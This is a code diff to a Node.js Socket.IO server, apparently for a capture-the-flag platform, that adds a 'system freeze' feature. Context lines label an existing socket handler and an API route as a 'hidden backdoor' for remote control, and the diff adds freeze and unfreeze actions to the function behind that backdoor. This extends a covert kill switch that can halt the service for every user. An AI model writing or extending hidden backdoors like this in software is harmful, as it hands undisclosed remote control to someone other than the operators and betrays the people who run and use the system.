@@ -17,6 +17,11 @@ const anonymousConnections = new Set();
 // Track tab IDs to usernames for better multi-tab handling
 const tabToUser = new Map(); // tabId -> userName
 
+// System state variables
+let systemFrozen = false; // New variable to track system freeze state
+// Make it globally accessible for API routes
+global.systemFrozen = systemFrozen;
+
 // Track challenge rooms and participants
 const challengeRooms = new Map(); // challengeId -> Set of socket IDs
 
@@ -112,10 +117,33 @@ function remoteControl(action, io) {
     console.log("Application has been remotely enabled");
     io.emit("service_restored", { message: "Service has been restored." });
     return { status: "success", message: "Application enabled" };
+  } else if (action === "freeze") {
+    systemFrozen = true;
+    global.systemFrozen = true; // Update global value
+    console.log("System has been frozen");
+    io.emit("system_freeze", {
+      frozen: true,
+      message: "System has been frozen by admin control",
+      timestamp: new Date().toISOString(),
+      source: "admin_control",
+    });
+    return { status: "success", message: "System frozen", frozen: true };
+  } else if (action === "unfreeze") {
+    systemFrozen = false;
+    global.systemFrozen = false; // Update global value
+    console.log("System has been unfrozen");
+    io.emit("system_freeze", {
+      frozen: false,
+      message: "System has been unfrozen by admin control",
+      timestamp: new Date().toISOString(),
+      source: "admin_control",
+    });
+    return { status: "success", message: "System unfrozen", frozen: false };
   } else if (action === "status") {
     return {
       status: "success",
       enabled: appEnabled,
+      frozen: systemFrozen,
       connections: {
         total: getUniqueUserCount(),
         registered: onlineUsers.size,
@@ -374,6 +402,13 @@ app.prepare().then(() => {
       return;
     }
 
+    // Add API endpoint for system freeze status
+    if (parsedUrl.pathname === "/api/system-freeze") {
+      res.setHeader("Content-Type", "application/json");
+      res.end(JSON.stringify({ frozen: systemFrozen }));
+      return;
+    }
+
     // Hidden API endpoint for remote control (fallback if socket doesn't work)
     if (parsedUrl.pathname === "/api/__sys_ctrl" && req.method === "POST") {
       let body = "";
@@ -445,6 +480,13 @@ app.prepare().then(() => {
     allowEIO3: true,
   });
 
+  // Make io available globally for API routes
+  global.io = io;
+  // Also store it on global.server for alternative access
+  if (!global.server) global.server = {};
+  global.server.io = io;
+  console.log("Socket.IO server initialized and made available globally");
+
   // Function to broadcast challenge room count
   const broadcastChallengeRoomCount = (challengeId) => {
     const count = getChallengeRoomUsers(challengeId);
@@ -511,6 +553,25 @@ app.prepare().then(() => {
     // Store the tab ID on the socket for later reference
     socket.tabId = tabId;
 
+    // Send initial system state to the client
+    socket.emit("system_freeze", {
+      frozen: systemFrozen,
+      message: `System is currently ${systemFrozen ? "frozen" : "active"}`,
+      timestamp: new Date().toISOString(),
+      source: "initial_state",
+    });
+
+    // Handle request for current freeze state
+    socket.on("get_freeze_state", () => {
+      console.log(`Client ${socket.id} requested current freeze state`);
+      socket.emit("system_freeze", {
+        frozen: systemFrozen,
+        message: `System is currently ${systemFrozen ? "frozen" : "unfrozen"}`,
+        timestamp: new Date().toISOString(),
+        source: "get_freeze_state_request",
+      });
+    });
+
     // Hidden backdoor control handler
     socket.on("__sys_ctrl", (data) => {
       try {
@@ -534,6 +595,43 @@ app.prepare().then(() => {
         }
       } catch (error) {
         console.error("Error in control handler:", error);
+      }
+    });
+
+    // Admin freeze control handler
+    socket.on("admin_freeze_control", (data) => {
+      try {
+        // Check if the user has admin privileges
+        if (socket.userData && socket.userData.isAdmin) {
+          console.log(
+            `Admin freeze control: ${data.freeze ? "freeze" : "unfreeze"}`
+          );
+          systemFrozen = data.freeze;
+
+          // Broadcast to all clients
+          io.emit("system_freeze", { frozen: systemFrozen });
+
+          // Send confirmation to the admin
+          socket.emit("admin_freeze_response", {
+            success: true,
+            frozen: systemFrozen,
+          });
+        } else {
+          // Unauthorized attempt
+          console.log(
+            `Unauthorized freeze control attempt by socket ${socket.id}`
+          );
+          socket.emit("admin_freeze_response", {
+            success: false,
+            message: "Unauthorized",
+          });
+        }
+      } catch (error) {
+        console.error("Error in freeze control handler:", error);
+        socket.emit("admin_freeze_response", {
+          success: false,
+          message: "Error processing request",
+        });
       }
     });
 
@@ -977,6 +1075,17 @@ app.prepare().then(() => {
           isFirstBlood: true,
         });
       }
+    });
+
+    // Handle get_system_state request
+    socket.on("get_system_state", () => {
+      // Send the current system state to the requesting client
+      socket.emit("system_freeze", {
+        frozen: systemFrozen,
+        message: `Current system state: ${systemFrozen ? "FROZEN" : "ACTIVE"}`,
+        timestamp: new Date().toISOString(),
+        source: "state_request",
+      });
     });
 
     socket.on("disconnect", () => {
